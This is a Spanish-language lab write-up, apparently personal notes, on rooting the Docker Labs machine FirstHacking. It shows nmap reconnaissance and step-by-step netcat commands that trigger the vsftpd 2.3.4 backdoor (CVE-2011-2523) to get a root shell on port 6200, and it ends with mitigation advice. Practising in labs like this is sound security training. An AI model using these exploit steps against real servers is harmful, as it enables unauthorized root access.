
| Plataforma          | Docker Labs |
| ------------------- | ----------- |
| Dificultad          | Muy Fácil   |
| IP de la Máquina    | 172.17.0.2  |
| Fecha de resolución | 03/10/2026  |
# 📑 WRITEUP: FIRSTHACKING

> [!INFO] **RESUMEN**
> - **IP Objetivo:** `172.17.0.2`
> - **Sistema Operativo:** Linux 🐧
> - **Descripción:** Laboratorio para practicar la explotación del backdoor de vsftpd 2.3.4 para obtener acceso como root.🚪
> - **Privilegios Obtenidos:** `root` 👑

---

## 🎯 FASE 1: RECONOCIMIENTO Y ENUMERACIÓN

### 💻 Conectividad Inicial
Determinamos el Sistema Operativo analizando el Time To Live (TTL) mediante un paquete ICMP:
```bash
ping -c 1 172.17.0.2
```

![[Laboratorios - Nivel Muy Fácil/Firsthacking/Capturas/PING a IP objetivo.png]]

* **Diagnóstico:** TTL = `64`. Confirmamos de manera directa un entorno **Linux**.

### 🔍 Mapeo de Puertos y Servicios
Lanzamos un escaneo con **Nmap** para identificar las vías de acceso expuestas.

![[Laboratorios - Nivel Muy Fácil/Firsthacking/Capturas/Scan NMAP.png]]

| Puerto | Servicio | Versión Detectada | Estado / Nota |
| :--- | :--- | :--- | :--- |
| `21/TCP` | FTP | **vsftpd 2.3.4** | 🔴 Crítico (Vulnerable a Backdoor Remoto) |

#### Comando de Nmap utilizado:
```bash
sudo nmap -p- -sS -sV --min-rate 5000 -n -Pn --open 172.17.0.2
```

---

## ⚡ FASE 2: EXPLOTACIÓN (ACCESO INICIAL)

La versión de servicio expuesta `vsftpd 2.3.4` posee una vulnerabilidad histórica crítica (**CVE-2011-2523**). Si se envía cualquier nombre de usuario que finalice con los caracteres `:)`, el FTP activa de manera automática e interna una shell interactiva escuchando en el puerto **6200/TCP**.

> [!TIP] Método de Explotación Manual (Netcat)
> 1. Nos conectamos al puerto 21 y enviamos el disparador en el campo de usuario:
>    ```bash
>    nc -vn 172.17.0.2 21
>    # Respuesta: 220 (vsFTPd 2.3.4)
>    USER Gus:)
>    PASS cualquier_cosa
>    ```
> 2. Abrimos una pestaña secundaria en nuestra terminal y nos conectamos al puerto oculto recién activado:
>    ```bash
>    nc -vn 172.17.0.2 6200
>    ```

![[Netcat IP.png]]

![[Laboratorios - Nivel Muy Fácil/Firsthacking/Capturas/Puerto 6200.png]]

---

## 👑 FASE 3: ESCALADA DE PRIVILEGIOS

Debido a que el servicio afectado por la puerta trasera se ejecuta con los máximos privilegios nativos dentro del contenedor, la terminal obtenida en el puerto alterno nos otorga control total inmediato.

Ejecutamos el comando de verificación de identidad:
```bash
whoami
```

![[Laboratorios - Nivel Muy Fácil/Firsthacking/Capturas/ROOT.png]]

```bash
# Output directo de la terminal comprometida:
root
```

> [!SUCCESS] **MÁQUINA COMPLETADA**
> Al igual que en vectores de intrusión directa en aplicaciones mal configuradas, no se requirió una fase de escalada de privilegios posterior. El acceso inicial se consolidó directamente como **`root`**.

---

## 🛠️ FASE 4: VULNERABILIDADES Y MITIGACIONES

>[!DANGER] CWE-506

>[!DANGER] Crítica
>La versión de vsftpd 2.3.4 (CVE-2011-2523) contiene una puerta trasera que otorga una shell como root sin autenticación necesaria.

>[!Todo] Mitigación
>Desinstalar inmediatamente la versión obsoleta y comprometida `vsftpd 2.3.4` y actualizar el servicio de transferencia de archivos a una versión segura y oficialmente soportada.
Configurar políticas de filtrado que bloqueen de forma proactiva puertos de alta numeración no estandarizados (como el `6200`) para mitigar la efectividad de backdoors en entornos expuestos.
